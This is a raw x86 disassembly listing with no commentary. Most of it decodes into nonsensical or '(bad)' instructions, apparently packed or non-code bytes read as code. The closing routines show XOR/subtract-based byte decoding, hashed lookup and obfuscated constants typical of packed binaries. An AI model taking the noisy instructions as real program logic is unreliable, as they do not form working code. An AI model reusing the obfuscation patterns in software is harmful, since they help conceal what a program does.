  41a769:	mov    WORD PTR [eax+0x3c42b9fa],gs
  41a76f:	mov    ah,0x27
  41a771:	jmp    0x4d9e7f0d
  41a776:	test   eax,0xc5608fa9
  41a77b:	mov    edi,DWORD PTR [edi+0x7332e253]
  41a781:	out    0xca,al
  41a783:	sbb    al,0xa1
  41a785:	ds add al,0x2c
  41a788:	les    esi,FWORD PTR [edx]
  41a78a:	mov    edi,0x28f5ef18
  41a78f:	adc    al,0x1b
  41a791:	pop    esi
  41a792:	retf   
  41a793:	xchg   ebx,eax
  41a794:	push   0x44
  41a796:	data16 mov WORD PTR [ebp+0x73f388a4],es
  41a79d:	cmp    ebx,edx
  41a79f:	mov    edx,0x525cc626
  41a7a4:	loope  0x41a7b1
  41a7a6:	sub    eax,0x468f6d0f
  41a7ab:	icebp  
  41a7ac:	push   eax
  41a7ad:	das    
  41a7ae:	sahf   
  41a7af:	pop    esp
  41a7b0:	pop    ecx
  41a7b1:	lds    esp,FWORD PTR [ebx-0x6c6870bd]
  41a7b7:	ss push eax
  41a7b9:	retf   0xd670
  41a7bc:	je     0x41a74c
  41a7be:	xor    cl,BYTE PTR [eax+0x19]
  41a7c1:	aad    0xed
  41a7c3:	in     eax,0xf
  41a7c5:	fadd   DWORD PTR [ebx-0x12118f31]
  41a7cb:	ffreep st(6)
  41a7cd:	pop    ebp
  41a7ce:	dec    ecx
  41a7cf:	std    
  41a7d0:	(bad)
  41a7d4:	test   BYTE PTR [edi+ecx*8+0x2a54ba55],cl
  41a7db:	fadd   st,st(6)
  41a7dd:	les    ebx,FWORD PTR ss:[edx-0x798918a5]
  41a7e4:	inc    ecx
  41a7e5:	ds aad 0x40
  41a7e8:	add    DWORD PTR [edi+0x1f2e417b],0x84998bdc
  41a7f2:	jecxz  0x41a845
  41a7f4:	(bad)  
  41a7f6:	xor    eax,0x8153a15f
  41a7fb:	jecxz  0x41a868
  41a7fd:	inc    edx
  41a7fe:	cmp    eax,0xccc6b4f3
  41a803:	ja     0x41a79d
  41a805:	sbb    BYTE PTR [esp+ebp*2],bh
  41a808:	fnsave gs:[esp+esi*8-0x37]
  41a80d:	rcl    BYTE PTR [edi],0x5c
  41a810:	lods   al,BYTE PTR ds:[esi]
  41a811:	nop
  41a812:	sahf   
  41a813:	push   es
  41a814:	gs fsub st,st(6)
  41a817:	inc    esi
  41a818:	loop   0x41a84a
  41a81a:	dec    ecx
  41a81b:	aaa    
  41a81c:	in     al,dx
  41a81d:	or     eax,0xf7037c1b
  41a822:	or     esi,esp
  41a824:	mov    eax,0x10f47d1b
  41a829:	adc    bl,BYTE PTR [eax-0x79]
  41a82c:	add    cl,bl
  41a82e:	cmp    DWORD PTR [edi+ebp*2-0x51],ebx
  41a832:	fisub  DWORD PTR ds:0x8a470565
  41a839:	pop    edi
  41a83a:	xor    DWORD PTR [ecx+edx*1],ecx
  41a83d:	add    ebx,esi
  41a83f:	leave  
  41a840:	jp     0x41a80e
  41a842:	into   
  41a843:	adc    eax,0xcb2b540c
  41a848:	mov    ebp,0xc8c6aed2
  41a84d:	in     eax,dx
  41a84e:	push   es
  41a84f:	cmp    dl,bh
  41a851:	xor    cl,cl
  41a853:	retf   0xe4f0
  41a856:	cmp    eax,eax
  41a858:	dec    eax
  41a859:	or     esi,DWORD PTR [eax-0x2d]
  41a85c:	inc    ecx
  41a85d:	nop
  41a85e:	pop    edi
  41a85f:	push   esi
  41a860:	fcom   QWORD PTR [edi]
  41a862:	mov    edx,DWORD PTR [esi-0xb]
  41a865:	jns    0x41a88a
  41a867:	stc    
  41a868:	es int3 
  41a86a:	push   esi
  41a86b:	out    0xb0,al
  41a86d:	pop    ds
  41a86e:	lahf   
  41a86f:	and    DWORD PTR [ebx-0x4d],edx
  41a872:	daa    
  41a873:	pop    ds
  41a874:	out    0x24,al
  41a876:	mov    ds:0x3a4ed6c4,eax
  41a87b:	(bad)
  41a881:	push   esi
  41a882:	dec    ebp
  41a883:	int    0xd4
  41a885:	jo     0x41a82b
  41a887:	stc    
  41a888:	mov    ebx,0x631a437a
  41a88d:	repnz sbb esi,DWORD PTR [edi]
  41a890:	mov    bh,0xdc
  41a892:	shr    DWORD PTR [esi-0x293558d],1
  41a898:	push   esp
  41a899:	loope  0x41a8c8
  41a89b:	xchg   ebp,eax
  41a89c:	push   ebp
  41a89d:	aaa    
  41a89e:	into   
  41a89f:	mov    ah,0x51
  41a8a1:	jo     0x41a914
  41a8a3:	jns    0x41a8e8
  41a8a5:	push   esp
  41a8a6:	(bad)  
  41a8a7:	cmp    DWORD PTR [edi+eiz*1],esp
  41a8aa:	sub    ebx,DWORD PTR [ecx-0x5f]
  41a8ad:	mov    cl,0xf0
  41a8af:	lods   eax,DWORD PTR ds:[esi]
  41a8b0:	or     al,0x74
  41a8b2:	and    ebp,DWORD PTR [edi-0x29]
  41a8b5:	inc    edx
  41a8b6:	jnp    0x41a838
  41a8b8:	repnz out dx,eax
  41a8ba:	nop
  41a8bb:	into   
  41a8bc:	cmp    edx,edx
  41a8be:	int    0xb0
  41a8c0:	fisttp WORD PTR [ecx-0x6e]
  41a8c3:	pop    es
  41a8c4:	xlat   BYTE PTR ds:[ebx]
  41a8c5:	cmp    eax,0x7a7630bc
  41a8ca:	xor    al,0x5a
  41a8cc:	pop    ecx
  41a8cd:	retf   
  41a8ce:	leave  
  41a8cf:	and    eax,0x1711fe2f
  41a8d4:	mov    eax,ds:0x34370a87
  41a8d9:	inc    ebx
  41a8da:	sti    
  41a8db:	mov    ds:0x7540a189,al
  41a8e0:	and    ebx,DWORD PTR [edi+ebx*2+0x25c11317]
  41a8e7:	dec    esp
  41a8e8:	das    
  41a8e9:	nop
  41a8ea:	std    
  41a8eb:	and    bl,BYTE PTR [ecx]
  41a8ed:	xchg   BYTE PTR [edx+eiz*2+0x7e],bh
  41a8f1:	pop    es
  41a8f2:	adc    ebx,DWORD PTR [eax+0x31788012]
  41a8f8:	lea    esp,[ebp+0x2a]
  41a8fb:	pop    es
  41a8fc:	push   es
  41a8fd:	pop    ss
  41a8fe:	inc    esi
  41a8ff:	cmp    DWORD PTR [edx],ebx
  41a901:	outs   dx,BYTE PTR ds:[esi]
  41a902:	retf   0xee27
  41a905:	add    BYTE PTR [eax+edi*1-0x3e],cl
  41a909:	xchg   ecx,eax
  41a90a:	sar    DWORD PTR [edi-0x58],0x23
  41a90e:	or     dl,BYTE PTR [edi+edx*8]
  41a911:	cmp    al,0xb5
  41a913:	pop    esp
  41a914:	cmp    eax,eax
  41a916:	sub    al,0x5b
  41a918:	stos   DWORD PTR es:[edi],eax
  41a919:	add    eax,0x7abfce15
  41a91e:	add    BYTE PTR [ebp+ecx*4-0x6264c34],bh
  41a925:	mov    edx,0x520ef122
  41a92a:	ins    DWORD PTR es:[edi],dx
  41a92b:	xor    bl,0xcf
  41a92e:	ds ins DWORD PTR es:[edi],dx
  41a930:	cdq    
  41a931:	adc    al,0x74
  41a933:	je     0x41a99f
  41a935:	xchg   edx,eax
  41a936:	sub    al,ch
  41a938:	jnp    0x41a95a
  41a93a:	jae    0x41a9ae
  41a93c:	test   al,0x2
  41a93e:	rcr    ecx,0x1a
  41a941:	js     0x41a989
  41a943:	lods   eax,DWORD PTR ds:[esi]
  41a944:	aaa    
  41a945:	xchg   esi,eax
  41a946:	pop    ebx
  41a947:	or     ebp,ebx
  41a949:	push   cs
  41a94a:	iret   
  41a94b:	ds xchg edi,eax
  41a94d:	pusha  
  41a94e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a94f:	cli    
  41a950:	xor    dl,ch
  41a952:	pop    ss
  41a953:	and    BYTE PTR [ebp+edi*1-0x33b9bacf],ah
  41a95a:	xor    ebx,esp
  41a95c:	ja     0x41a955
  41a95e:	dec    ebx
  41a95f:	cmp    edi,DWORD PTR [eax-0xe]
  41a962:	lea    ecx,[ebx]
  41a964:	scas   al,BYTE PTR es:[edi]
  41a965:	inc    esp
  41a966:	mov    ecx,0x1c0127ec
  41a96b:	fimul  WORD PTR [edx]
  41a96d:	iret   
  41a96e:	(bad)  
  41a96f:	inc    edi
  41a970:	int3   
  41a971:	sub    al,0xf5
  41a974:	retf   
  41a975:	push   eax
  41a976:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a977:	mov    bl,0xd2
  41a979:	test   ch,dl
  41a97b:	xor    edi,DWORD PTR [esp+esi*2]
  41a97e:	call   0x67702d5c
  41a983:	popf   
  41a984:	pop    edx
  41a985:	xchg   esi,eax
  41a986:	sub    eax,0xcc548a4e
  41a98b:	sbb    eax,0x26dfc38a
  41a990:	cli    
  41a991:	and    al,BYTE PTR [esi]
  41a993:	scas   al,BYTE PTR es:[edi]
  41a994:	add    al,0xaf
  41a996:	dec    edi
  41a997:	cmp    eax,0x5bed92d3
  41a99c:	xchg   ebx,eax
  41a99d:	xor    BYTE PTR [eax-0x15],0x5b
  41a9a1:	into   
  41a9a2:	aaa    
  41a9a3:	xchg   esp,eax
  41a9a4:	xchg   edi,edx
  41a9a6:	xor    ebx,edx
  41a9a8:	aaa    
  41a9a9:	gs cdq 
  41a9ab:	push   esi
  41a9ac:	mov    esi,0xeff3c21d
  41a9b1:	int3   
  41a9b2:	add    DWORD PTR [ecx-0x5f3d84a2],esp
  41a9b8:	adc    al,0x30
  41a9ba:	and    esp,ebx
  41a9bc:	mov    esp,0x924a17d1
  41a9c1:	outs   dx,BYTE PTR ds:[esi]
  41a9c2:	pop    esp
  41a9c3:	pop    edi
  41a9c4:	push   0xca4d4c70
  41a9c9:	not    BYTE PTR [esi+0x19702960]
  41a9cf:	mov    edx,0x7b5c516b
  41a9d4:	xchg   edi,eax
  41a9d5:	pop    ecx
  41a9d6:	imul   edx,DWORD PTR [edx-0x15],0xb63c11f4
  41a9dd:	dec    esi
  41a9de:	xchg   esi,eax
  41a9df:	jnp    0x41aa21
  41a9e1:	repz xor DWORD PTR [edi],0xe0a6b0fd
  41a9e8:	pushf  
  41a9e9:	xor    BYTE PTR [edx],bl
  41a9eb:	cwde   
  41a9ec:	jle    0x41aa6a
  41a9ee:	popa   
  41a9ef:	sbb    eax,0x1b31b153
  41a9f4:	sbb    ebx,DWORD PTR [edi]
  41a9f6:	cdq    
  41a9f7:	aaa    
  41a9f8:	call   0xe7b7:0xe36f4fae
  41a9ff:	test   BYTE PTR [esp+esi*8-0xd],cl
  41aa03:	sbb    dl,BYTE PTR [esi]
  41aa05:	stos   BYTE PTR es:[edi],al
  41aa06:	aaa    
  41aa07:	leave  
  41aa08:	(bad)  
  41aa0a:	test   DWORD PTR [edx],edx
  41aa0c:	cdq    
  41aa0d:	mov    dl,0xfc
  41aa0f:	mov    edx,0x202e8dde
  41aa14:	jne    0x41aa14
  41aa16:	sub    edx,DWORD PTR [ecx-0x3ed211f0]
  41aa1c:	scas   al,BYTE PTR es:[edi]
  41aa1d:	mov    al,0x46
  41aa1f:	pop    ds
  41aa20:	cmp    eax,0xabc3d587
  41aa25:	xchg   esi,eax
  41aa26:	in     al,dx
  41aa27:	mov    eax,ds:0xeb45d4e3
  41aa2c:	jo     0x41aa00
  41aa2e:	cwde   
  41aa2f:	jne    0x41aa7d
  41aa31:	test   al,0xc6
  41aa33:	xchg   ebx,eax
  41aa34:	fcomip st,st(0)
  41aa36:	xchg   DWORD PTR [edi-0x68b40cb0],edx
  41aa3c:	jmp    0x41aaba
  41aa3e:	lock retf 
  41aa40:	cmp    eax,0x9f0ab502
  41aa45:	pop    esi
  41aa46:	sbb    DWORD PTR [edi],0x11
  41aa49:	push   esp
  41aa4a:	jge    0x41aa38
  41aa4c:	sbb    DWORD PTR [ecx],esi
  41aa4e:	cmc    
  41aa4f:	mov    edx,0x109ae9c8
  41aa54:	stos   BYTE PTR es:[edi],al
  41aa55:	es or  al,0xd8
  41aa58:	xchg   esp,eax
  41aa59:	mov    edx,ebp
  41aa5b:	hlt    
  41aa5c:	pop    ss
  41aa5d:	sub    ebp,DWORD PTR [esi]
  41aa5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aa60:	retf   0xc4de
  41aa63:	in     al,dx
  41aa64:	imul   esi,DWORD PTR [eax+0x40615499],0x7
  41aa6b:	arpl   WORD PTR [esi],bp
  41aa6d:	gs sti 
  41aa6f:	sub    ch,bl
  41aa71:	cmp    DWORD PTR [eax],0xe56e0fb5
  41aa77:	mov    bl,bh
  41aa79:	stos   DWORD PTR es:[edi],eax
  41aa7a:	pop    eax
  41aa7b:	ja     0x41aa72
  41aa7d:	(bad)  
  41aa7f:	mov    edx,0xc18ff588
  41aa84:	mul    DWORD PTR [esi-0x69]
  41aa87:	xor    DWORD PTR [ebx+0x670c6d8c],esi
  41aa8d:	hlt    
  41aa8e:	in     al,dx
  41aa8f:	sub    al,0xf0
  41aa91:	sbb    ecx,DWORD PTR [ebp+edx*2-0x32]
  41aa95:	hlt    
  41aa96:	sbb    eax,0x5a917b00
  41aa9b:	xor    al,0xd2
  41aa9d:	or     eax,0x8b0ee1a7
  41aaa2:	jmp    0xcfb4619
  41aaa7:	mov    gs,edi
  41aaa9:	enter  0xb4de,0x13
  41aaad:	sub    BYTE PTR [ebp+0x3e],dh
  41aab0:	jae    0x41aa68
  41aab2:	call   0xf76a:0x15c015cd
  41aab9:	enter  0x5b8a,0x9c
  41aabd:	add    BYTE PTR [edx+0x5a],ch
  41aac0:	sub    al,BYTE PTR [edi-0x2b964e84]
  41aac6:	call   0xc127ce43
  41aacb:	sub    eax,ebx
  41aacd:	mov    bl,0xd9
  41aacf:	aas    
  41aad0:	xor    dl,dh
  41aad2:	out    dx,eax
  41aad3:	scas   eax,DWORD PTR es:[edi]
  41aad4:	fisttp QWORD PTR [edx+0x5f]
  41aad7:	icebp  
  41aad8:	enter  0xc7e8,0x62
  41aadc:	fisttp QWORD PTR [edx-0x30]
  41aadf:	mov    ebx,0x337e3a1e
  41aae4:	cmp    bl,cl
  41aae6:	out    dx,eax
  41aae7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aae8:	mov    al,0xc0
  41aaea:	(bad)  
  41aaeb:	cwde   
  41aaec:	inc    edx
  41aaed:	cmp    eax,0x6717b141
  41aaf2:	call   0xf347:0x5898c113
  41aaf9:	es dec esi
  41aafb:	jnp    0x41aaa2
  41aafd:	fstp   DWORD PTR [ebx+0x74]
  41ab00:	and    BYTE PTR [eax],ch
  41ab02:	mov    al,0x48
  41ab04:	(bad)  
  41ab05:	cmp    edx,DWORD PTR [edx-0x53]
  41ab08:	dec    edx
  41ab09:	adc    BYTE PTR [ebx-0x67],0x33
  41ab0d:	pop    ebx
  41ab0e:	xor    eax,0x4191990d
  41ab13:	dec    eax
  41ab14:	fadd   st(2),st
  41ab16:	scas   al,BYTE PTR es:[edi]
  41ab17:	cmp    eax,0x54749bf2
  41ab1c:	loop   0x41ab68
  41ab1e:	pop    ebp
  41ab1f:	pop    es
  41ab20:	mov    ebp,0x5bd3c65f
  41ab25:	or     al,0x6c
  41ab27:	mov    ah,0xa7
  41ab29:	xchg   ecx,eax
  41ab2a:	push   ss
  41ab2b:	and    dl,BYTE PTR [ecx+0x53]
  41ab2e:	(bad)
  41ab31:	pop    edi
  41ab32:	repz jnp 0x41ab0b
  41ab35:	pop    es
  41ab36:	jmp    0x41ab72
  41ab38:	sar    DWORD PTR [eax],1
  41ab3a:	loop   0x41aae7
  41ab3c:	aaa    
  41ab3d:	fwait
  41ab3e:	mov    eax,0x3a165381
  41ab43:	pop    esp
  41ab44:	mov    eax,ds:0x223f3eea
  41ab49:	xchg   DWORD PTR [eax+esi*1],eax
  41ab4c:	std    
  41ab4d:	inc    ecx
  41ab4e:	retf   0xefe2
  41ab51:	out    dx,al
  41ab52:	das    
  41ab53:	scas   al,BYTE PTR es:[edi]
  41ab54:	stos   BYTE PTR es:[edi],al
  41ab55:	cs pop ebx
  41ab57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab58:	dec    ecx
  41ab59:	call   0x133cb76e
  41ab5e:	dec    esp
  41ab5f:	xchg   edx,eax
  41ab60:	popf   
  41ab61:	stos   DWORD PTR es:[edi],eax
  41ab62:	pop    ecx
  41ab63:	mov    es:0x76a08d25,al
  41ab69:	cld    
  41ab6a:	inc    edx
  41ab6b:	or     eax,esp
  41ab6d:	xor    eax,0x94a3653f
  41ab72:	stos   DWORD PTR es:[edi],eax
  41ab73:	xor    al,0x3e
  41ab75:	sti    
  41ab76:	mov    ch,0xdd
  41ab78:	add    ebp,DWORD PTR [edi+0x3d5d2c61]
  41ab7e:	and    edx,DWORD PTR [ebx-0x21b98372]
  41ab84:	push   ds
  41ab85:	call   0x92f5b628
  41ab8a:	xchg   BYTE PTR [esi-0x164f0fa8],cl
  41ab90:	inc    ebp
  41ab91:	or     al,0x17
  41ab93:	mov    al,BYTE PTR [edx+0x50]
  41ab96:	mov    ?,ecx
  41ab98:	lods   eax,DWORD PTR ds:[esi]
  41ab99:	cmc    
  41ab9a:	setg   BYTE PTR [ebx-0xb]
  41ab9e:	cmp    BYTE PTR [ebp-0x71],dh
  41aba1:	cmp    al,BYTE PTR [edi]
  41aba3:	call   0xd177:0x79f3726d
  41abaa:	jne    0x41ab43
  41abac:	ret    
  41abad:	cld    
  41abae:	xor    ebx,DWORD PTR [esi]
  41abb0:	mov    ds,WORD PTR [ebx+ebx*8]
  41abb3:	test   DWORD PTR [eax-0x70],edx
  41abb6:	fmul   DWORD PTR [esi-0x43]
  41abb9:	cmp    al,0x9c
  41abbb:	pop    ebx
  41abbc:	mov    bh,0x90
  41abbe:	popa   
  41abbf:	scas   al,BYTE PTR es:[edi]
  41abc0:	rcl    DWORD PTR [edi+0x45],1
  41abc3:	mov    ch,0xad
  41abc5:	jmp    0xddc06ec6
  41abca:	ds xchg bh,ah
  41abcd:	push   DWORD PTR [eax-0x2b03ce4e]
  41abd3:	sub    ebx,DWORD PTR [eax+0x2ac8994a]
  41abd9:	mov    bh,BYTE PTR ds:0xc2331d33
  41abdf:	fild   WORD PTR ds:0xe029e101
  41abe5:	data16 (bad) 
  41abe7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41abe8:	inc    esp
  41abe9:	cli    
  41abea:	and    DWORD PTR [eax+0x60],0xffffffeb
  41abee:	add    ebx,edi
  41abf0:	pop    esp
  41abf1:	inc    edx
  41abf2:	into   
  41abf3:	push   0xa7851e27
  41abf8:	sub    BYTE PTR [ebp+0x77fd3bff],ch
  41abfe:	xchg   ebp,eax
  41abff:	pop    ds
  41ac00:	cmp    al,0xc1
  41ac02:	adc    eax,0xf85a2448
  41ac07:	sub    dh,BYTE PTR [ecx-0x48]
  41ac0a:	mov    cl,0xac
  41ac0c:	add    BYTE PTR [ebx-0x67],al
  41ac0f:	es retf 
  41ac11:	shl    BYTE PTR [eax],1
  41ac13:	xchg   esi,eax
  41ac14:	inc    eax
  41ac15:	jmp    0x41ac43
  41ac17:	add    eax,0x5ebabeb8
  41ac1c:	mov    ds:0x7230aa48,eax
  41ac21:	sar    DWORD PTR [edi-0x53656338],1
  41ac27:	inc    ebp
  41ac28:	pop    ds
  41ac29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac2a:	and    DWORD PTR [esi-0x497d662c],ebx
  41ac30:	jns    0x41abd8
  41ac32:	mov    ebx,0xee2eb13b
  41ac37:	push   0xffffffec
  41ac39:	rol    DWORD PTR [edi+0x55b148a7],0x8f
  41ac40:	jae    0x41ac2d
  41ac42:	xor    DWORD PTR [edi+0x6d],edi
  41ac45:	jae    0x41ac65
  41ac47:	shr    BYTE PTR [esi+ebx*1+0x8],cl
  41ac4b:	sbb    dh,BYTE PTR [edi-0x6fa81db9]
  41ac51:	mov    cl,0x65
  41ac53:	sar    BYTE PTR [eax+0x4a],cl
  41ac56:	fucomi st,st(2)
  41ac58:	jmp    0xe8d2e84e
  41ac5d:	mov    cl,0xeb
  41ac5f:	push   es
  41ac60:	jmp    0xc8e0:0xa89a565b
  41ac67:	mov    bh,bl
  41ac69:	push   ds
  41ac6a:	hlt    
  41ac6b:	mov    eax,ds:0x24bb94a9
  41ac70:	popf   
  41ac71:	add    dl,BYTE PTR [eax+0x4476b4df]
  41ac77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac78:	sar    BYTE PTR [edi-0x1e7e2746],cl
  41ac7e:	(bad)  
  41ac7f:	adc    ebp,DWORD PTR [ebx]
  41ac81:	sbb    cl,BYTE PTR [ebp+0x248b0a8f]
  41ac87:	cwde   
  41ac88:	xor    eax,0xf5d5fd24
  41ac8d:	imul   ebx,DWORD PTR [ecx-0x75e5dd56],0xe40e64c6
  41ac97:	mov    WORD PTR [edx+0x4f],ds
  41ac9a:	jne    0x41acdf
  41ac9c:	push   ebp
  41ac9d:	push   es
  41ac9e:	mov    dl,0xab
  41aca0:	dec    ebp
  41aca1:	sbb    bl,BYTE PTR [ebx]
  41aca3:	popa   
  41aca4:	cmp    DWORD PTR [edx-0x11bb0b15],ebp
  41acaa:	sub    DWORD PTR [esi-0x76a6f959],edx
  41acb0:	xchg   edi,eax
  41acb2:	pop    ds
  41acb3:	mov    ch,0xa4
  41acb5:	jmp    0x9dfa:0xcdc5271
  41acbc:	stc    
  41acbd:	inc    esi
  41acbe:	inc    edx
  41acbf:	dec    esi
  41acc0:	in     eax,0x5b
  41acc2:	mov    edi,0xcb42cfe7
  41acc7:	rcl    ebp,1
  41acc9:	sbb    ah,ah
  41accb:	out    0x74,al
  41accd:	pop    ecx
  41acce:	test   al,0x61
  41acd0:	cmp    edi,esp
  41acd2:	push   esp
  41acd3:	or     bh,ah
  41acd5:	jecxz  0x41ad0d
  41acd7:	jmp    0x67ca3f0b
  41acdc:	jbe    0x41ace0
  41acde:	mov    esp,0xb9b9b08f
  41ace3:	cmp    dl,BYTE PTR [edx+0x3a1a431d]
  41ace9:	sbb    BYTE PTR [ebx-0x5b25eeb9],0x57
  41acf0:	fs mov dl,0xf7
  41acf3:	or     DWORD PTR [eax-0x6c0ebda9],ebp
  41acf9:	in     al,dx
  41acfa:	and    ebp,ecx
  41acfc:	push   esi
  41acfd:	(bad)  
  41acfe:	jne    0x41aca0
  41ad00:	ins    BYTE PTR es:[edi],dx
  41ad01:	mov    ebp,0xc1e8f8aa
  41ad06:	(bad)  
  41ad08:	call   FWORD PTR [edi+0x35]
  41ad0b:	idiv   DWORD PTR [ecx-0x6b5a917a]
  41ad11:	pop    ebx
  41ad12:	call   0xc1f81e19
  41ad17:	sub    eax,0x9b7bac09
  41ad1c:	push   ecx
  41ad1d:	xlat   BYTE PTR ds:[ebx]
  41ad1e:	out    dx,al
  41ad1f:	fstp   QWORD PTR [edx+0x21]
  41ad22:	inc    ecx
  41ad23:	dec    ebp
  41ad24:	(bad)  
  41ad25:	jp     0x41acee
  41ad27:	mov    eax,ds:0x358db1c3
  41ad2c:	jmp    0xf0ba:0xea31931d
  41ad33:	(bad)  
  41ad34:	sti    
  41ad35:	stc    
  41ad36:	test   al,0xc4
  41ad38:	std    
  41ad39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad3a:	je     0x41ad1b
  41ad3c:	int3   
  41ad3d:	dec    esp
  41ad3e:	and    ecx,ecx
  41ad40:	adc    BYTE PTR ds:0xfc479bad,cl
  41ad46:	jl     0x41ad53
  41ad48:	fstp   DWORD PTR [esi]
  41ad4a:	push   0x9d7b37b8
  41ad4f:	cdq    
  41ad50:	adc    eax,0x186b814e
  41ad55:	sub    ebp,DWORD PTR ds:0x88029e87
  41ad5b:	cld    
  41ad5c:	mov    ebx,0x510ada74
  41ad61:	fdivr  DWORD PTR ds:0x427b2c97
  41ad67:	ror    BYTE PTR [eax],0x5a
  41ad6a:	fild   QWORD PTR [ebx-0x3b87a97b]
  41ad70:	out    0x46,eax
  41ad72:	inc    esp
  41ad73:	push   eax
  41ad74:	jge    0x41ad52
  41ad76:	or     eax,0x160c11be
  41ad7b:	aas    
  41ad7c:	jo     0x41ad32
  41ad7e:	xlat   BYTE PTR ds:[ebx]
  41ad7f:	ins    DWORD PTR es:[edi],dx
  41ad80:	push   ebp
  41ad81:	aaa    
  41ad82:	stos   DWORD PTR es:[edi],eax
  41ad83:	mov    edx,0xbb275e16
  41ad88:	mov    ds:0x28702994,al
  41ad8d:	pop    edi
  41ad8e:	mov    ch,0x6f
  41ad90:	ins    DWORD PTR es:[edi],dx
  41ad91:	or     edx,DWORD PTR [esp+eax*8+0x16]
  41ad95:	daa    
  41ad96:	or     ecx,DWORD PTR [eax]
  41ad98:	iret   
  41ad99:	sbb    al,0x43
  41ad9b:	pop    ecx
  41ad9c:	cmp    eax,0x51e3e4c8
  41ada1:	or     esp,DWORD PTR [eax*2-0x3856feb4]
  41ada8:	(bad)  
  41ada9:	and    BYTE PTR ss:[edi-0x3a],ah
  41adad:	xchg   DWORD PTR [esi],edx
  41adaf:	daa    
  41adb0:	rcl    DWORD PTR ds:[edi+eiz*8-0x519d6993],1
  41adb8:	shl    DWORD PTR [edx],1
  41adba:	(bad)  
  41adbb:	std    
  41adbc:	sub    esp,DWORD PTR [ebx-0x51]
  41adbf:	dec    eax
  41adc0:	xor    DWORD PTR [ebx+0x3954139f],ecx
  41adc6:	dec    eax
  41adc7:	sbb    ebx,DWORD PTR [ebp-0x7d]
  41adca:	xchg   BYTE PTR [ebx],al
  41adcc:	push   ebx
  41adcd:	hlt    
  41adce:	or     al,BYTE PTR [esi+0x3c]
  41add1:	push   edi
  41add2:	test   al,0x8d
  41add4:	outs   dx,BYTE PTR ds:[esi]
  41add5:	out    0x62,al
  41add7:	dec    eax
  41add8:	add    al,0xdb
  41adda:	outs   dx,BYTE PTR ds:[esi]
  41addb:	inc    edi
  41addc:	dec    eax
  41addd:	scas   al,BYTE PTR es:[edi]
  41adde:	ret    0x65f7
  41ade1:	adc    esp,edi
  41ade3:	xor    dh,BYTE PTR [ebp-0x1c]
  41ade6:	es add dh,cl
  41ade9:	lds    edx,FWORD PTR [edi]
  41adeb:	inc    ebx
  41adec:	mov    DWORD PTR [ebp-0x8],eax
  41adef:	push   DWORD PTR [ebp+0x18]
  41adf2:	jmp    0x41ae4b
  41adf7:	mov    ecx,DWORD PTR [ebp-0x8]
  41adfa:	add    ecx,eax
  41adfc:	mov    DWORD PTR [ebp-0x14],ecx
  41adff:	mov    ecx,DWORD PTR [ebp-0x14]
  41ae02:	mov    ecx,DWORD PTR [ecx+0xc]
  41ae05:	movsx  cx,BYTE PTR [ecx+eax*1]
  41ae0a:	mov    edx,0x3b4b
  41ae0f:	sub    cx,dx
  41ae12:	mov    edx,0x8a85
  41ae17:	xor    cx,dx
  41ae1a:	mov    edx,0x4f85
  41ae1f:	cmp    cx,dx
  41ae22:	jne    0x41adef
  41ae28:	mov    ecx,DWORD PTR ds:0x421c66
  41ae2e:	mov    ecx,DWORD PTR [ecx+0x198]
  41ae34:	mov    DWORD PTR [ecx],eax
  41ae36:	jmp    0x41ae5c
  41ae3b:	mov    ecx,DWORD PTR [ebp+0x18]
  41ae3e:	cmp    ecx,0xf89c85b5
  41ae44:	jne    0x41ae5c
  41ae4a:	push   eax
  41ae4b:	push   DWORD PTR [ebp+0x14]
  41ae4e:	push   DWORD PTR [ebp+0x10]
  41ae51:	push   DWORD PTR [ebp+0xc]
  41ae54:	push   DWORD PTR [ebp+0x8]
  41ae57:	call   0x413d37
  41ae5c:	pop    edi
  41ae5d:	pop    esi
  41ae5e:	leave  
  41ae5f:	ret    0x14
  41ae62:	push   ebp
  41ae63:	mov    ebp,esp
  41ae65:	push   ecx
  41ae66:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  41ae6d:	mov    eax,DWORD PTR [ebp-0x4]
  41ae70:	mov    ecx,DWORD PTR ds:0x42b010
  41ae76:	sbb    DWORD PTR ds:0x42a018,ecx
  41ae7c:	mov    edx,DWORD PTR [ebp+0x10]
  41ae7f:	mov    DWORD PTR ds:0x42801c,0x4950
  41ae89:	mov    ecx,0x7510893
  41ae8e:	sbb    DWORD PTR ds:0x428028,0x4a48
  41ae98:	xor    eax,ecx
  41ae9a:	add    DWORD PTR ds:0x42b000,0x42800c
  41aea4:	add    eax,0x3272db
  41aea9:	mov    DWORD PTR ds:0x42a014,0x169
  41aeb3:	mov    DWORD PTR [edx],eax
  41aeb5:	sbb    eax,edx
  41aeb7:	mov    eax,DWORD PTR [ebp+0xc]
  41aeba:	xor    eax,ecx
  41aebc:	inc    edx
  41aebd:	push   esi
  41aebe:	xor    esi,edx
  41aec0:	mov    esi,DWORD PTR [ebp+0x10]
  41aec3:	mov    edx,0x3272db
  41aec8:	add    eax,edx
  41aeca:	add    DWORD PTR ds:0x42b01c,0x428020
  41aed4:	mov    DWORD PTR [esi+0x4],eax
  41aed7:	mov    eax,DWORD PTR [ebp+0x14]
  41aeda:	mov    esi,DWORD PTR ds:0x428024
  41aee0:	sbb    esi,DWORD PTR ds:0x429010
  41aee6:	mov    DWORD PTR ds:0x428024,esi
  41aeec:	mov    esi,DWORD PTR [ebp+0x10]
  41aeef:	mov    DWORD PTR [esi+0x8],eax
  41aef2:	mov    eax,DWORD PTR [ebp+0x18]
  41aef5:	mov    esi,DWORD PTR [ebp+0x10]
  41aef8:	mov    DWORD PTR [esi+0xc],eax
  41aefb:	mov    eax,DWORD PTR [ebp+0x1c]
  41aefe:	mov    esi,DWORD PTR [ebp+0x10]
  41af01:	mov    DWORD PTR [esi+0x10],eax
  41af04:	mov    eax,DWORD PTR [ebp+0x8]
  41af07:	xor    eax,ecx
  41af09:	add    eax,edx
  41af0b:	pop    esi
  41af0c:	leave  
  41af0d:	ret    0x18
  41af10:	push   ebp
  41af11:	mov    ebp,esp
  41af13:	sub    esp,0x94
